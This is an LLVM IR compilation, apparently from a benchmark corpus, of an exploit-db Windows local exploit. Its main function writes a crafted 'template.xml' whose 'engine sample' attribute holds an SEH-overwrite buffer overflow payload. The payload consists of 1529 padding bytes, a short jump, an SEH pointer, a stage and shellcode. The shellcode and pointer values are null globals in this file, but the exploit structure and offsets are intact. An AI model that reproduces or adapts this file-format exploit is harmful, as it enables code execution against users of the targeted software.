; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_18471.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_18471.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [13 x i8] c"template.xml\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.2 = private unnamed_addr constant [32 x i8] c"Failed to open '%s' for writing\00", align 1
@.str.3 = private unnamed_addr constant [58 x i8] c"<section name=\22Sound\22>\0A<attstr name=\22engine sample\22 val=\22\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@short_jump = common dso_local global i8* null, align 8
@seh_pointer = common dso_local global i8* null, align 8
@stage = common dso_local global i8* null, align 8
@shellcode = common dso_local global i8* null, align 8
@.str.5 = private unnamed_addr constant [5 x i8] c"\22/>\0A\00", align 1
@.str.6 = private unnamed_addr constant [39 x i8] c"<attnum name=\22rpm scale\22 val=\220.35\22/>\0A\00", align 1
@.str.7 = private unnamed_addr constant [12 x i8] c"</section>\0A\00", align 1
@.str.8 = private unnamed_addr constant [11 x i8] c"</params>\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %7, align 4
  %8 = call i32* @fopen(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0))
  store i32* %8, i32** %6, align 8
  %9 = load i32*, i32** %6, align 8
  %10 = icmp eq i32* %9, null
  br i1 %10, label %11, label %13

11:                                               ; preds = %2
  %12 = call i32 @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %68

13:                                               ; preds = %2
  %14 = load i32*, i32** %6, align 8
  %15 = call i32 (i32*, i8*, ...) @fprintf(i32* %14, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.3, i64 0, i64 0))
  store i32 0, i32* %7, align 4
  br label %16

16:                                               ; preds = %22, %13
  %17 = load i32, i32* %7, align 4
  %18 = icmp slt i32 %17, 1529
  br i1 %18, label %19, label %25

19:                                               ; preds = %16
  %20 = load i32*, i32** %6, align 8
  %21 = call i32 @putc(i8 signext 65, i32* %20)
  br label %22

22:                                               ; preds = %19
  %23 = load i32, i32* %7, align 4
  %24 = add nsw i32 %23, 1
  store i32 %24, i32* %7, align 4
  br label %16

25:                                               ; preds = %16
  %26 = load i32*, i32** %6, align 8
  %27 = load i8*, i8** @short_jump, align 8
  %28 = call i32 (i32*, i8*, ...) @fprintf(i32* %26, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i8* %27)
  %29 = load i32*, i32** %6, align 8
  %30 = load i8*, i8** @seh_pointer, align 8
  %31 = call i32 (i32*, i8*, ...) @fprintf(i32* %29, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i8* %30)
  store i32 0, i32* %7, align 4
  br label %32

32:                                               ; preds = %38, %25
  %33 = load i32, i32* %7, align 4
  %34 = icmp slt i32 %33, 34
  br i1 %34, label %35, label %41

35:                                               ; preds = %32
  %36 = load i32*, i32** %6, align 8
  %37 = call i32 @putc(i8 signext 65, i32* %36)
  br label %38

38:                                               ; preds = %35
  %39 = load i32, i32* %7, align 4
  %40 = add nsw i32 %39, 1
  store i32 %40, i32* %7, align 4
  br label %32

41:                                               ; preds = %32
  %42 = load i32*, i32** %6, align 8
  %43 = load i8*, i8** @stage, align 8
  %44 = call i32 (i32*, i8*, ...) @fprintf(i32* %42, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i8* %43)
  store i32 0, i32* %7, align 4
  br label %45

45:                                               ; preds = %51, %41
  %46 = load i32, i32* %7, align 4
  %47 = icmp slt i32 %46, 8
  br i1 %47, label %48, label %54

48:                                               ; preds = %45
  %49 = load i32*, i32** %6, align 8
  %50 = call i32 @putc(i8 signext 65, i32* %49)
  br label %51

51:                                               ; preds = %48
  %52 = load i32, i32* %7, align 4
  %53 = add nsw i32 %52, 1
  store i32 %53, i32* %7, align 4
  br label %45

54:                                               ; preds = %45
  %55 = load i32*, i32** %6, align 8
  %56 = load i8*, i8** @shellcode, align 8
  %57 = call i32 (i32*, i8*, ...) @fprintf(i32* %55, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i8* %56)
  %58 = load i32*, i32** %6, align 8
  %59 = call i32 (i32*, i8*, ...) @fprintf(i32* %58, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0))
  %60 = load i32*, i32** %6, align 8
  %61 = call i32 (i32*, i8*, ...) @fprintf(i32* %60, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.6, i64 0, i64 0))
  %62 = load i32*, i32** %6, align 8
  %63 = call i32 (i32*, i8*, ...) @fprintf(i32* %62, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.7, i64 0, i64 0))
  %64 = load i32*, i32** %6, align 8
  %65 = call i32 (i32*, i8*, ...) @fprintf(i32* %64, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.8, i64 0, i64 0))
  %66 = load i32*, i32** %6, align 8
  %67 = call i32 @close(i32* %66)
  store i32 0, i32* %3, align 4
  br label %68

68:                                               ; preds = %54, %11
  %69 = load i32, i32* %3, align 4
  ret i32 %69
}

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @printf(i8*, i8*) #1

declare dso_local i32 @fprintf(i32*, i8*, ...) #1

declare dso_local i32 @putc(i8 signext, i32*) #1

declare dso_local i32 @close(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
